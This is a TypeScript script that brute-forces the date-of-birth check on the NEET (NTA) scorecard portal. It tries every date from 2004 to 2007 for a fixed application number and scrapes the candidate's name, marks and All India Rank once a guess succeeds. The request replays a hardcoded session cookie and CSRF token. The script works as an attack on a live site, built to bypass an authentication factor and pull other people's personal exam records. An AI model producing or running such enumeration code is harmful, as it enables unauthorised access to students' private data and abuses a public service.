import axios from 'axios';
import qs from 'qs';
import cheerio from 'cheerio';


interface solve{
  applicationNumber:string;
  day:string;
  month:string;
  year:string;
}
async function solve({applicationNumber,day,month,year}:solve){

let data = qs.stringify({
  '_csrf-frontend': '5WxpSgNN7XpEyiSUUbPfVBHnM-C2DunP9-f38CQoOQPSGR0uURSFFS-EQ6Yz2JYHIbBppfJ_j4uC3pWkdU9-QQ==',
  'Scorecardmodel[ApplicationNumber]': applicationNumber,
  'Scorecardmodel[Day]': day,
  'Scorecardmodel[Month]': month,
  'Scorecardmodel[Year]': year 
});

let config = {
  method: 'post',
  maxBodyLength: Infinity,
  url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
  headers: { 
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
    'Accept-Language': 'en-IN,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-XA;q=0.6,en-GB;q=0.5,en-US;q=0.4', 
    'Cache-Control': 'max-age=0', 
    'Connection': 'keep-alive', 
    'Content-Type': 'application/x-www-form-urlencoded', 
    'Cookie': 'advanced-frontend=7vjb2f66vnqf3g8fffs19fip1n; _csrf-frontend=d174b62cbbbaddac647a264a5907b948ba3cadf76a42be3b7a24369bc6ef9dd7a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%227utdRYhokNg2bkIS0WZEDqfDu9bTQgGB%22%3B%7D', 
    'Origin': 'null', 
    'Sec-Fetch-Dest': 'document', 
    'Sec-Fetch-Mode': 'navigate', 
    'Sec-Fetch-Site': 'same-origin', 
    'Sec-Fetch-User': '?1', 
    'Upgrade-Insecure-Requests': '1', 
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 
    'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"', 
    'sec-ch-ua-mobile': '?0', 
    'sec-ch-ua-platform': '"Windows"'
  },
  data : data
};

const response=await axios.request(config);
const parsedData=parseHtml(JSON.stringify(response.data));

if(parsedData){
  console.log(parsedData.marks);
  console.log(parsedData.allIndiaRank);
}
return parsedData;
}

function parseHtml(htmlContent:string){
  const $=cheerio.load(htmlContent);

  const applicationNumber = $('td:contains("Application No.")').next('td').text().trim() || 'N/A';
              // Find the candidate's name
              const candidateName = $('td:contains("Candidate’s Name")').next().text().trim() || 'N/A';
            
              // Find the All India Rank
              const allIndiaRank = $('td:contains("NEET All India Rank")').next('td').text().trim() || 'N/A';
  
              const marks = $('td:contains("Total Marks Obtained (out of 720)")').next('td').text().trim() || 'N/A';
              
              // console.log(`Application Number: ${applicationNumber}`);
              // console.log(`Candidate's Name: ${candidateName}`);
              // console.log(`All India Rank: ${allIndiaRank}`); 
              // console.log(`Marks: ${marks}`);
            
              if(allIndiaRank==='N/A'){
                return null;
              }

              return{
                applicationNumber,
                candidateName,
                allIndiaRank,
                marks
              }
  
}

async function main(rollNumber:string) {
  for(let year=2007;year>=2004;year--){
    for(let month=1;month<=12;month++){
      for(let day=1;day<=31;day++){
        console.log(`Processing ${rollNumber} for ${year}-${month}-${day}`);
        const data=await solve({
          applicationNumber: rollNumber,
          day: day.toString(),
          month: month.toString(),
          year: year.toString()
        });

      if(data){
       console.log(data);
       process.exit(1);
      }
      }
    }
  }
}

main('240411183517');


